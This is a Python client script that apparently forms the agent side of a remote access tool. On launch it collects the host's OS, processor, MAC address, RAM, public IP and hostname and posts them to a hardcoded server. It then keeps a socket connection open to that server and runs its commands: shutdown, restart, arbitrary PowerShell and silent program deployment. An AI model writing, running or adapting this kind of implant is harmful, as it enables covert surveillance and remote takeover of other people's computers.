import socket
# from aiohttp import client
import requests
import platform 
from client_functions import client_func
import threading
import psutil
from getmac import get_mac_address

class main:
    def __init__(self):
        self.base_url = "http://10.247.71.196:6969"
        self.ip = "10.247.71.196"
        self.port = 4969
        self.grab_specs()
        threading.Thread(target=self.constant_connection).start()
    def grab_specs(self):
        self.os_type = platform.platform()
        self.processor = platform.processor()
        self.mac_address = get_mac_address()

        self.ram_amount = convert_bytes(psutil.virtual_memory().total)
        try:
            self.ip_address = requests.get("https://api.ipify.org?format=json").json()["ip"]
        except:
            self.ip_address = "null"
        
        self.host_name = socket.gethostname()

        self.upload_data()

    def upload_data(self):
        print("Sending request...")
        send_data = requests.post(
            url = self.base_url + "/auth",
            headers={
                "content-type":"application/json"
            },
            json = {
                "hostname":self.host_name,
                "ip_address":self.ip_address,
                "os":platform.system(),
                "os_type":self.os_type,
                "processor":self.processor,
                "mac_address":self.mac_address,
                "ram":self.ram_amount
            },
            # for the moment, it'll be test, we can update this later
            cookies={
                "X-API-KEY":"test"
            }
        )
        print("Done")
        print(send_data.text)
    def constant_connection(self):
        try:
            print("Attempting to connect...")
            self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.addr = (self.ip, self.port)
            self.client.connect(self.addr)
        except Exception as error_connecting:
            raise SystemExit(error_connecting)
        print("Connected Successfully")
        threading.Thread(target=self.recieve).start()
        self.send_message(f"hostname:{self.host_name}")
    def send_message(self, message):
        self.client.send(message.encode())
    def recieve(self):
        while True:
            data = (self.client.recv(2048)).decode()
            print(f"Recieved: {data}")
            if not data:
                print("Server broke the connection")
                break
            if data.startswith("execute:"):
                data = data.split("execute:")[1]
                if data == "shutdown":
                    client_func.shutdown_computer()
                elif data == "restart":
                    client_func.restart_computer()
            elif data.startswith("powershell:"):
                data = data.split("powershell:")[1]
                client_func.execute_powershell(data)
            elif data.startswith("program:"):
                data = data.split("program:")[1]
                client_func.silent_deploy(data)
            


def convert_bytes(B):
    GB = float(1024 ** 3) 
    return '{0:.2f} GB'.format(B / GB)



a = main()

# a.upload_data()

    
